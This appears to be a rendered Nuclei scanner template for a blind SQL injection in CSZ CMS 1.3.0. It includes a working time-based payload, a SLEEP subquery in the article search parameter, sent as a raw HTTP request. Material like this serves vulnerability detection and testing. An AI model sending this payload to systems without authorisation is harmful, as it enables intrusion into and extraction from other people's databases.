# Nuclei Template: CSZ CMS 1.3.0 - SQL Injection
**Template ID:** csz-cms-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`csz-cms-sqli.yaml`)

## Vulnerability Information & PoC

## Description
CSZ CMS version 1.3.0 suffers from multiple remote blind SQL injection vulnerabilities.

## Steps to reproduce / Exploit Payload
```http
@timeout: 20s
GET /csz-cms/plugin/article/search?p=3D1%27%22)%20AND%20(SELECT%203910%20FROM%20(SELECT(SLEEP(6)))qIap)--%20ogLS HTTP/1.1
Host: {{Hostname}}
```

## References
- https://packetstormsecurity.com/files/167028/CSZ-CMS-1.3.0-SQL-Injection.html
